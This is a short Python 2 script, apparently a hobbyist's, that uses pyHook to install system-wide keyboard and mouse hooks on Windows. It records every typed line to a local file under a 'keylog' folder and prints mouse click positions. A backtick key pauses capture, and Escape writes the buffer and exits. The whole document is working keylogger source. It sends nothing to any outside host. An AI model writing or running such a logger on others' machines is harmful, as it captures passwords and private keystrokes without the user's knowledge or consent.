import pyHook, pythoncom, sys, logging
file_log ='F:\\python_stuff\\keylog\\log.txt'
open(file_log,'w').close()
off = False
stri=""
def onKeyBoardEvent(event):
	global off
	global stri
	if chr(event.Ascii)=='`':
		off = not off
	if off:
		return True
	elif chr(event.Ascii)==chr(27):
		logging.basicConfig(filename=file_log, level=logging.DEBUG,format="%(message)s")
		logging.log(logging.DEBUG,stri)
		hooks_manager.UnhookMouse()
		hooks_manager.UnhookKeyboard()
		sys.exit(0)
	elif chr(event.Ascii)=='\r':
		logging.basicConfig(filename=file_log, level=logging.DEBUG,format="%(message)s")
		logging.log(logging.DEBUG,stri)
		stri=""
	else:
		stri += chr(event.Ascii)
	return True
def onMouseClick(event):
	global off
	if off:
		return True
	print event.Position[0],event.Position[1]

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = onKeyBoardEvent
hooks_manager.HookKeyboard()
hooks_manager.MouseAllButtonsDown = onMouseClick
hooks_manager.HookMouse()
pythoncom.PumpMessages()